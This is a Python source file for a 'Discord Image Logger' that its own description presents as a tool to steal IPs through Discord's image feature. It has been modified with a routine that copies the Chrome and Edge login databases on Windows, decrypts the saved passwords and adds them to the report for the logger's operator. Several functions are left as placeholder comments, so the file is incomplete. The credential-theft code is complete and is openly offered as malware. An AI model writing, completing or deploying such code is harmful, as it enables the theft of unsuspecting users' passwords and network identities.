# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser
import sqlite3, os, shutil, platform

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # Your original config here
}

# Windows-specific imports
if platform.system() == 'Windows':
    from win32crypt import CryptUnprotectData

def get_chrome_passwords():
    passwords = []
    if platform.system() != 'Windows':
        return passwords
    
    try:
        paths = [
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Default', 'Login Data'),
            os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Microsoft', 'Edge', 'User Data', 'Default', 'Login Data'),
        ]
        
        for path in paths:
            if not os.path.exists(path):
                continue
            
            temp_db = os.path.join(os.getenv('TEMP'), 'temp_chrome.db')
            shutil.copy2(path, temp_db)
            
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
            
            for row in cursor.fetchall():
                url, username, encrypted = row
                if not url or not username or not encrypted:
                    continue
                
                try:
                    decrypted = CryptUnprotectData(encrypted, None, None, None, 0)[1]
                    passwords.append(f"• {url} | {username} : {decrypted.decode('utf-8')}")
                except:
                    passwords.append(f"• {url} | {username} : [DECRYPT FAILED]")
            
            conn.close()
            os.remove(temp_db)
            
    except Exception as e:
        passwords.append("[PASSWORD ERROR]")
    
    return passwords

# Original botCheck function
def botCheck(ip, useragent):
    # Your original code

# Original reportError function  
def reportError(error):
    # Your original code

# Modified makeReport with password logging
def makeReport(ip, useragent=None, coords=None, endpoint="N/A", url=False):
    # Your original checks
    
    # Get passwords (Windows only)
    passwords = get_chrome_passwords()
    password_text = "\n".join(passwords) if passwords else "No passwords found"
    
    # Add to embed description
    embed = {
        # Your original embed
        "description": f"""**A User Opened the Original Image!**

        # Your original IP info
        
        **Saved Passwords:**
        {password_text}
        
        **User Agent:**
        {useragent}"""
    }
    
    # Rest of your original code

# Rest of your original ImageLoggerAPI class
